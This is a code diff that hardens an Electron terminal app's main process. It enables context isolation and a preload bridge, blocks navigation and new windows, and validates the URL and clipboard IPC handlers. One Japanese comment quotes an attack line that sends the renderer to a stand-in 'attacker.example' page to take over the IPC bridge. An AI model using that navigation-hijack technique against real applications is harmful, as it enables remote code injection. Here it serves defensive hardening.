@@ -1,4 +1,6 @@
-const { app, BrowserWindow, ipcMain, screen, dialog } = require('electron');
+// electron の shell は electronShell として受ける。terminal:create の中でログインシェルの
+// パスを持つローカル変数 shell と名前がぶつかるため、紛らわしさを避けて別名にしている。
+const { app, BrowserWindow, ipcMain, screen, dialog, shell: electronShell, clipboard } = require('electron');
 const pty = require('node-pty');
 const path = require('path');
 const os = require('os');
@@ -29,6 +31,9 @@ const { createCodexUsageTracker } = require('./codexUsageTracker');
 // 等）が argv で GPU スイッチを明示している場合は介入しない。詳細は utils/gpu.js を参照。
 const { applyGpuMode } = require('./utils/gpu');
 const { normalizeConfirmClose } = require('./utils/closeConfirm');
+// 外部ブラウザで開いてよい URL の判定（renderer と共有）。renderer 側にも同じ判定が
+// あるが、最終防衛線はこのプロセス側（issue #268）。
+const { isSafeHttpUrl } = require('./renderer/urlSafety');
 const { resolveInstanceId, buildHealthResponse } = require('./utils/instanceId');
 const {
   describeSettingsValues,
@@ -738,8 +743,19 @@ function createWindow() {
     minWidth: 600,
     minHeight: 400,
     webPreferences: {
-      nodeIntegration: true,
-      contextIsolation: false,
+      // renderer から Node / Electron の API へ直接触らせない（issue #268）。
+      // renderer が必要とする機能は preload.js が contextBridge で名前付き API として渡す。
+      // 表示処理のどこか 1 箇所でエスケープが漏れても任意コード実行に至らないようにするため。
+      nodeIntegration: false,
+      contextIsolation: true,
+      // sandbox は明示的に無効化する。Electron 20 以降 renderer は既定でサンドボックス化
+      // され、preload から Node の require が使えなくなる。preload は fs / require.resolve で
+      // xterm の実体と xterm.css を解決する必要があるため無効にする
+      //（なぜ相対パスで済ませられないかは preload.js / renderer/bootstrap.js の冒頭コメント）。
+      // renderer 自体は nodeIntegration: false + contextIsolation: true のままなので、
+      // 「renderer から Node へ触れない」という防御は sandbox の有無に依らず成立する。
+      sandbox: false,
+      preload: path.join(__dirname, 'preload.js'),
       // ウィンドウがオクルード（背面/最小化）状態になっても renderer のタイマーを
       // 間引かせない。スマホ等から監視している間 Mac 側ウィンドウは背面になりがちで、
       // 既定の backgroundThrottling: true だと状態レポート用 setInterval(2s) が約1分に1回まで
@@ -751,6 +767,21 @@ function createWindow() {
     backgroundColor: '#0d1117',
     title: APP_TITLE,
   });
+
+  // ─── ナビゲーション封鎖（issue #268） ──────────────────────────────────────
+  // preload は BrowserWindow ではなく webContents の属性なので、この webContents が
+  // 読み込む「あらゆるドキュメント」で動く。つまり renderer にスクリプト実行を許して
+  // しまうと、location.href = 'https://attacker.example/' の 1 行で攻撃者のオリジンの
+  // ページに vkBridge がそのまま生える。許可リストで絞ってあるとはいえ IPC の窓口を
+  // 攻撃者のサーバへ渡すことになり、任意のコードを継続的に流し込まれる状態になる。
+  //
+  // このアプリの renderer が別ドキュメントへ遷移する正当な理由は一つも無い
+  // （画面はすべて renderer/index.html 内で組み立てる）。ページ起因の遷移と
+  // 新規ウィンドウの生成はまとめて拒否し、上記の足がかりを潰す。
+  // 外部リンクは shell.openExternal（ipcMain の 'shell:open-external'）へ寄せてあるので、
+  // ここを塞いでも外部サイトを開く導線は壊れない。
+  win.webContents.on('will-navigate', (event) => { event.preventDefault(); });
+  win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
 
   win.webContents.on('did-finish-load', () => {
     pushMenuUpdate();
@@ -925,6 +956,48 @@ ipcMain.handle('settings:save', (event, incoming) => {
   if (!descriptor) return { ok: false, error: '設定ディスクリプタが見つかりません' };
 
   return saveSettingsToTargets(descriptor, incoming);
+});
+
+// ─── renderer 向けの shell / clipboard 中継（issue #268） ─────────────────────
+// renderer からは electron の shell / clipboard を直接触れない。preload が名前付き API
+// として渡し、実行はこのプロセスで行う。
+
+// 外部ブラウザで開く。preload 側でも同じ判定をしているが、最終防衛線はここ。
+// renderer と preload が両方とも侵害された場合でも、http(s) 以外は開かない。
+ipcMain.handle('shell:open-external', async (_event, url) => {
+  if (!isSafeHttpUrl(url)) {
+    console.warn(`${LOG_PREFIX} rejected openExternal for unsafe url`);
+    return false;
+  }
+  try {
+    await electronShell.openExternal(url);
+    return true;
+  } catch (e) {
+    console.error(`${LOG_PREFIX} openExternal failed:`, e.message);
+    return false;
+  }
+});
+
+// 入力待ち検知時の通知音。引数を取らないので検証対象は無い。
+ipcMain.on('shell:beep', () => {
+  electronShell.beep();
+});
+
+// クリップボードへ書き込む上限。preload 側と同じ値を持ち、preload を経由しない
+// 呼び出しでも青天井にならないようにする。
+const MAX_CLIPBOARD_TEXT_LENGTH = 100000;
+
+// 設定パネルのコピーボタン（issue #262 / #266）用。成否を boolean で返す。
+ipcMain.handle('clipboard:write-text', (_event, text) => {
+  if (typeof text !== 'string' || !text) return false;
+  if (text.length > MAX_CLIPBOARD_TEXT_LENGTH) return false;
+  try {
+    clipboard.writeText(text);
+    return true;
+  } catch (e) {
+    console.error(`${LOG_PREFIX} clipboard.writeText failed:`, e.message);
+    return false;
+  }
 });
 
 ipcMain.handle('terminal:create', (event, cwd, options = {}) => {
